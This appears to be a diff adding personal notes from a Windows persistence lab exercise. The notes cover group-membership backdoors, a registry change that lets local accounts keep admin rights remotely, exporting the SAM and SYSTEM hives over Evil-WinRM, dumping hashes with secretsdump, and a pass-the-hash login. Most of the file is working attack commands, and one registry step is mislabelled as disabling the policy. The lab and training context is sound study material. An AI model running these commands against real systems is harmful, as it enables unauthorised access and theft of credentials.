@@ -1,0 +1,72 @@
+Assign Group Memberships
+
+We will assume you have dumped the password hashes of the victim machine
+
+
+The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. 
+
+With the following command:
+    -net localgroup administrators thmuser0 /add:
+        This will allow you to access the server by using RDP, WinRM or any other remote administration service available.
+
+If this looks too suspicious, you can use the Backup Operators group:
+    This would allow us to copy the content of the SAM and SYSTEM registry hives, 
+    which we can then use to recover the password hashes for all the users:
+
+    We begin by adding the account to the Backup Operators group:
+    -net localgroup "Backup Operators" thmuser1 /add
+
+This is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. 
+
+We'll use WinRM for this task:
+    -net localgroup "Remote Management Users" thmuser1 /add
+
+In our Kali Terminal:
+    -evil-winrm -i [TARGET IP] -u [USERNAME] -p [PASSWORD]
+    IF We are using WinRM, We are confined to a limited access token with no administrative privileges.
+
+    RESULT of the Evil-Winrm:
+    In Windowds Session via RDP:
+        ->whoami /groups == BUILTIN\Backup Operators Alias  S-1-5-32-551 Group used for deny only
+
+        To be able to regain administration privileges from your user, 
+        we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
+            
+        in the Windows RDP Machine Terminal:
+            -reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+Once all of this has been set up, we are ready to use our backdoor:
+    in Kali Evil-Winrm:
+        -whoami /groups
+
+        ->Result:
+            BUILTIN\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+
+
+We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
+
+    Evil-WinRM:
+            -reg save hklm\system system.bak
+            The operation completed successfully.
+
+            -reg save hklm\sam sam.bak
+            The operation completed successfully.
+
+            -download system.bak
+            Info: Download successful!
+
+            -download sam.bak
+            Info: Download successful!
+Note: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.
+
+With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
+
+Kali:
+-python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+
+Finnaly:
+
+Perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
+    -Kali$ evil-winrm -i 10.10.241.98 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
+
+
